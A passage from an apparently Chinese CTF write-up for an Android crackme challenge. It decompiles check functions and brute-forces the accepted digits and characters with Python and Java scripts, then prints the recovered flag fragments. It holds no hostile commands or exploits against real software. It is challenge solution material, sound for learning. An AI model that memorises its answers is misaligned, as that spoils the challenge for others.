class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rival<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>my <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> x <span class="token keyword">in</span> rival<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    my<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">for</span> x <span class="token keyword">in</span> my<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>结果为</p><figure class="highlight plain"><figcaption data-lang="plain"></figcaption><table><tr><td data-num="1"></td><td><pre>1211111213313331123112111232113113213322122121121231121112122232132131121222112212133233122212211221121213221131133331131313223212313113132123311232131113211312123211311231131312221123133313111231311313212221123112321313232213211113132133311321131113123222</pre></td></tr></table></figure><p>粘贴到安卓程序中，得到以下 flag 片段</p><p><code>Android_is_very_interesting_and_</code></p><h3 id="第二问猜数字"><a class="anchor" href="#第二问猜数字">#</a> 第二问：猜数字</h3><p>第二第三问需要以下工具</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phdmEtZGVjb21waWxlci9qZC1ndWk=">https://github.com/java-decompiler/jd-gui</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B4YjE5ODgvZGV4Mmphcg==">https://github.com/pxb1988/dex2jar</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2thdHJpbmF3ai9hcnRpY2xlL2RldGFpbHMvODAwMTYzMTU=">https://blog.csdn.net/katrinawj/article/details/80016315</span></p><p>这样反编译可以得到 java 代码，可读性比 smali 更优</p><p>在 <code>com/w4ter.w4terctf2024/SecondCheck.class</code> ，其中的函数 <code>check0</code> 到 <code>check15</code> 就是分别对 16 个数字进行检验</p><p>以 <code>check10</code> 为例，</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">check10</span><span class="token punctuation">(</span><span class="token keyword">int</span> paramInt<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    paramInt <span class="token operator">=</span> <span class="token function">xor</span><span class="token punctuation">(</span><span class="token function">xor</span><span class="token punctuation">(</span><span class="token function">xor</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">mul</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">mul</span><span class="token punctuation">(</span><span class="token function">xor</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token function">mul</span><span class="token punctuation">(</span><span class="token function">sub</span><span class="token punctuation">(</span>paramInt<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">boolean</span> bool <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token function">mul</span><span class="token punctuation">(</span><span class="token function">xor</span><span class="token punctuation">(</span><span class="token function">sub</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>paramInt<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1117943</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>      bool <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">return</span> bool<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>使用下面的 python 脚本，可以枚举出第 10 个数字</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">return</span> a <span class="token operator">^</span> b</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">return</span> a <span class="token operator">+</span> b</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">def</span> <span class="token function">sub</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> a <span class="token operator">-</span> b</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">def</span> <span class="token function">mul</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">return</span> a <span class="token operator">*</span> b</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>i<span class="token operator">=</span><span class="token number">10</span></pre></td></tr><tr><td data-num="17"></td><td><pre>up <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">**</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> up<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    paramInt <span class="token operator">=</span> j</pre></td></tr><tr><td data-num="20"></td><td><pre>    paramInt <span class="token operator">=</span> xor<span class="token punctuation">(</span>xor<span class="token punctuation">(</span>xor<span class="token punctuation">(</span>add<span class="token punctuation">(</span>mul<span class="token punctuation">(</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        add<span class="token punctuation">(</span>mul<span class="token punctuation">(</span>xor<span class="token punctuation">(</span>add<span class="token punctuation">(</span>mul<span class="token punctuation">(</span>sub<span class="token punctuation">(</span>paramInt<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    i <span class="token operator">=</span> sub<span class="token punctuation">(</span>paramInt<span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>sub<span class="token punctuation">(</span>mul<span class="token punctuation">(</span>xor<span class="token punctuation">(</span>sub<span class="token punctuation">(</span>add<span class="token punctuation">(</span>paramInt<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1117943</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>运行结果是 1217</p><p>类似的，可以得到全部 16 个数字</p><p>2,3,7,14,18,44,82,235,365,715,1217,3774,6025,14042,28572,51291</p><p>输入到安卓程序中，得到以下 flag 片段</p><p><code>Smkhwxi8wnGu14Jq</code></p><h3 id="第三问直捣黄龙"><a class="anchor" href="#第三问直捣黄龙">#</a> 第三问：直捣黄龙</h3><p>在 <code>com/w4ter.w4terctf2024/ThirdCheck.class</code> ，其中的函数 <code>check0</code> 到 <code>check23</code> 就是分别对 24 个字母进行检验</p><p>与之前不同的是，代码中加入了些奇怪的东西</p><p><img data-src="https://s2.loli.net/2024/04/29/1cfaVgDsSPFkeyB.png" alt="android-3"></p><p>要想结束 while 循环，就必须执行 3 处的 break，所以正确的字母输入后一定会执行 2 和 3 处的代码</p><p>2 处的代码会用到 i 的值，如果输入正确的字母后，只执行 2 处代码没有执行 1 处的代码，i 的值就恒定为 0 而与 paramInt 无关，结果是 paramInt 输入任何值都是合法的，这显然不合理，所以 1 处的代码一定会被执行</p><p>综上分析，第三问混淆的代码应该不会影响正常的执行逻辑，可以直接无视。</p><p>和第二问一样，写出以下脚本枚举字符</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">xor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">return</span> a <span class="token operator">^</span> b</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">return</span> a <span class="token operator">+</span> b</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">sub</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">return</span> a <span class="token operator">-</span> b</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">mul</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">return</span> a <span class="token operator">*</span> b</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># paramInt = 2</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment"># print(xor(xor(add(mul(add(xor(add(xor(sub(sub(add(xor(xor(paramInt, 1), 7), 7), 13), 8), 14), 5), 2), 12), 10), 14), 2), 5))</span></pre></td></tr><tr><td data-num="12"></td><td><pre>up<span class="token operator">=</span><span class="token number">256</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>up<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    paramInt <span class="token operator">=</span> j</pre></td></tr><tr><td data-num="15"></td><td><pre>    i <span class="token operator">=</span> sub<span class="token punctuation">(</span>add<span class="token punctuation">(</span>add<span class="token punctuation">(</span>xor<span class="token punctuation">(</span>paramInt<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sub<span class="token punctuation">(</span>mul<span class="token punctuation">(</span>xor<span class="token punctuation">(</span>mul<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">313</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>可以得到第三个字符是 <code>l</code></p><p>类似的，可以枚举得出其他字符，结果为</p><p><code>I_like_Android_Reverse!!</code></p><h3 id="java脚本"><a class="anchor" href="#java脚本">#</a> java 脚本</h3><blockquote><p>更简便的方法？</p></blockquote><p>利用已有的 java 源代码可写 java 脚本爆破：</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">System</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token class-name">SecondCheck</span><span class="token punctuation">.</span><span class="token class-name">SecondCheck</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token class-name">ThirdCheck</span><span class="token punctuation">.</span><span class="token class-name">ThirdCheck</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hack</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token constant">ENC2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> </pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token number">901</span><span class="token punctuation">,</span> <span class="token number">1554</span><span class="token punctuation">,</span> <span class="token number">17367</span><span class="token punctuation">,</span> <span class="token number">53318</span><span class="token punctuation">,</span> <span class="token number">68796</span><span class="token punctuation">,</span> <span class="token number">19575</span><span class="token punctuation">,</span> <span class="token number">1957</span><span class="token punctuation">,</span> <span class="token number">1461</span><span class="token punctuation">,</span> <span class="token number">485</span><span class="token punctuation">,</span> <span class="token number">790</span><span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token number">1281</span><span class="token punctuation">,</span> <span class="token number">218036</span><span class="token punctuation">,</span> <span class="token number">54829</span><span class="token punctuation">,</span> <span class="token number">2367142</span><span class="token punctuation">,</span> <span class="token number">28073245</span><span class="token punctuation">,</span> <span class="token number">51410</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> flag1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token 